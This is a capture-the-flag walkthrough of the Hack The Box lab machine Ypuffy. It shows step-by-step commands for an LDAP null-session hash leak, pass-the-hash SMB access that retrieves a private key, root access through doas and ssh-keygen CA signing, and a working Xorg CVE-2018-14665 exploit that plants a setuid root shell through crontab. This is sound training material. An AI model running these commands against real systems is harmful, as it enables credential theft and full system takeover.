@@ -1,0 +1,183 @@
+Ypuffy
+
+4t h February 2019 / Document No D19.100.06
+
+Prepared By: egre55
+Machine Author: AuxSarge
+Difficulty: Medium
+Classification: Official
+
+                                                                        Page 1 / 15
+SYNOPSIS
+
+Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It
+also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas
+command. An additional privilege escalation involving Xorg is also possible.
+
+Skills Required                       Skills Learned
+
+     Basic knowledge of LDAP and SMB       Crafting custom LDAP queries /
+         enumeration tools                     manually finding the RootDSE
+
+     Basic knowledge of Linux/BSD          Enumeration and exploitation of SSH
+                                               CA authentication configurations
+
+                                      Page 2 / 15
+Enumeration
+Nmap
+
+ masscan -p1-65535,U:1-65535 10.10.10.107 --rate=1000 -p1-65535,U:1-65535 -e tun0 > ports
+ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n'
+ ',' | sed 's/,$//')
+ nmap -Pn -sV -sC -p$ ports 10.10.10.107
+
+Nmap shows that SSH, Samba, LDAP and OpenBSD's httpd Web Server are available.
+                                                                                                                  Page 3 / 15
+Inspection of Web Page
+
+An attempt is made to navigate to port 80, but the server sends a FIN packet to immediately
+close the connection.
+
+After trial and error, a connection is attempted with an invalid HTTP verb, which returns an error.
+
+                                                                                                                  Page 4 / 15
+Searching for known vulnerabilities
+
+The following software/versions are identified:
+Samba 4.7.6
+OpenSSH 7.7
+LDAP (version unknown)
+OpenBSD httpd (version unknown)
+However, searchsploit doesn't reveal anything of interest. Attempting a null session SMB
+connection is also unsuccessful.
+
+                                                                                                                  Page 5 / 15
+Inspection of LDAP
+
+In order to query the LDAP server for entries, it is necessary to know the RootDSE. This is the
+instance by which a directory data tree is identified.
+This can be found using the Nmap script "ldap-rootdse.nse"
+ locate *ldap*.nse
+ nmap -Pn -p389 --script=ldap-rootdse.nse 10.10.10.107
+
+This accomplishes the task, but it would be good to understand how it did this. In IppSec's Ypuffy
+video, he shows how examination of network traffic can reveal what is going on underneath the
+hood. This is worth checking out.
+This knowledge allows for custom ldapsearch queries can be crafted, which can return the
+RootDSE and other values.
+The Nmap script is run and Wireshark captures the traffic. Examination of the LDAP packets
+reveals an "attributes" section of the packet.
+
+                                                                                                                  Page 6 / 15
+Right-click on "attributes", select "Copy", then "...as Printable Text". After formatting into a single
+space-delimited line of LDAP attributes, the following ldapsearch query can be crafted.
+ ldapsearch -x -h 10.10.10.107 -s base domainControllerFunctionality
+ configurationNamingContext currentTime defaultNamingContext dnsHostName
+ domainFunctionality dsServiceName forestFunctionality highestCommittedUSN
+ isGlobalCatalogReady isSynchronized ldap-get-baseobject ldapServiceName
+ namingContexts rootDomainNamingContext schemaNamingContext serverName
+ subschemaSubentry supportedCapabilities supportedControl supportedLDAPPolicies
+ supportedLDAPVersion supportedSASLMechanisms altServer supportedExtension
+
+Output from this reveals that the RootDSE is "dc=hackthebox,dc=htb".
+
+The following ldapsearch query can now be crafted, which will return the subitems of any object
+class, under the RootDSE.
+
+                                                                                                                  Page 7 / 15
+ ldapsearch -x -h 10.10.10.107 -s sub ' (objectclass=*)' -b "dc=hackthebox,dc=htb"
+Of particular interest is the user "alice1978", who has an NT password hash stored in the
+"sambaNTPassword" attribute.
+
+An empty LM hash of the same length is generated, and combined to form the NTLM hash.
+ echo $(python -c "print str(0)*32") :0B186E661BBDBDCF6047784DE8B9FD8B
+
+                                                                                                                  Page 8 / 15
+Inspection of SMB
+
+SMBMap accepts a password hash in place of a password, and a connection as "alice1978" is
+successful. The share "alice" is accessible and contains a PuTTY SSH private key.
+
+This is downloaded, confirmed as PuTTY format and converted to OpenSSH format.
+ smbmap -H 10.10.10.107 -u alice1978 -p
+ '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' --download
+ alice/my_private_key.ppk
+
+ apt-get install putty-tools
+ puttygen 10.10.10.107-alice_my_private_key.ppk -O private-openssh -o alice.pem
+
+                                                                                                                  Page 9 / 15
+Foothold
+Enumeration
+doas
+
+After connecting over SSH, LinEnum identifies the system as OpenBSD 6.3, and reveals the user
+"userca". A CA certificate pair is in the user's home directory.
+
+sudo is not available, but OpenBSD's "doas" utility allows for much the same functionality.
+Examination of the file / etc/doas.conf reveals that alice is permitted to run
+/usr/bin/ssh-keygen a s userca, without having to enter a password.
+
+                                                                                                                 Page 10 / 15
+Web server
+
+A request to the webpage is sent from inside the machine, but again this yields no output.
+Examination of webroot reveals several potentially interesting folders.
+
+The access log is checked, and requests to /sshauth are visible.
+
+Requests are sent to this URL, and the RSA key for alice1978 is returned, although nothing is
+returned for root.
+ curl ' http://127.0.0.1/sshauth?type=keys&username=alice1978'
+
+The httpd configuration file is checked, which reveals that requests to the /sshauth path are
+handled by a Python/WSGI application.
+
+                                                                                                                 Page 11 / 15
+Page 12 / 15
+SSH
+
+The SSH config file is examined, which reveals that the previous URL can also contain a
+"principals" parameter.
+ less /etc/ssh/sshd_config
+
+This URL is requested with various system users specified. SSH CA authentication maps the
+principal "3m3rgencyB4ckd00r" to root.
+
+                                                                                                                 Page 13 / 15
+Privilege Escalation
+Signing root SSH key
+
+In the Ypuffy video, IppSec exploits this scenario by first generating an SSH key pair for root.
+
+The key is signed using the CA certificate, with the principal "3m3rgencyB4ckd00r" specified. It is
+now possible to login as root using the signed SSH key and gain the root flag.
+ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root
+ root
+
+                                                                                                                 Page 14 / 15
+Additional Privilege Escalation
+Xorg
+
+The xorg-x11-server package on the system suffers from a root privilege escalation vulnerability
+(CVE-2018-14665). This vulnerability was discovered by Narendra Shinde (@nushinde), while the
+exploit code below was authored by Marco Ivaldi (@0xdea).
+https://lists.x.org/archives/xorg-announce/2018-October/002927.html
+https://www.exploit-db.com/exploits/45742
+
+ cat << EOF > /tmp/xorgasm
+ cp /bin/sh /usr/l ocal/ bin/pwned
+ chmod 4777 /usr/l ocal/ bin/pwned
+ EOF
+ chmod +x /tmp/xorgasm
+
+ cd /etc
+ Xorg -fp " * * * * * root /tmp/xorgasm" -logfile crontab :1 &
+ sleep 5
+ pkill Xorg
+
+ ls -l /etc/crontab*
+ ls -l /usr/local/bin/pwned
+
+                                                                                                                 Page 15 / 15
+
